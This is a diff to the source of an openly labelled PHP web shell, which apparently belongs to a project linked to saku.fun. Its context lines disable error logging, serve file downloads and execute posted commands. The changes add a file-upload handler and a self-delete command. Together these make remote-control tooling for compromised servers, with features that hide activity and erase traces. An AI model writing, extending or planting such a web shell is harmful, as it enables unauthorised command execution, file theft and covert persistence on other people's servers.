@@ -4,7 +4,7 @@
  *
  * A simple web shell made in PHP.
  *
- * @since 1.0.4
+ * @since 1.0.5
  * @link  https://saku.fun/
  */
 ini_set('log_errors', '0');
@@ -32,12 +32,23 @@ if (isset($_GET['download'])) {
     $Shell->Download($_GET['download']);
 }
 
+// file upload
+if (isset($_GET['upload'])) {
+    $Shell->Upload();
+}
+
 if (isset($_POST['cmd'])) {
     $cmd = trim($_POST['cmd']);
 
     // Screen reset.
     if ($cmd === 'clear') {
         $Shell->clear();
+        exit();
+    }
+
+    // Self delete
+    if ($cmd === 'delete') {
+        $Shell->delete();
         exit();
     }
 
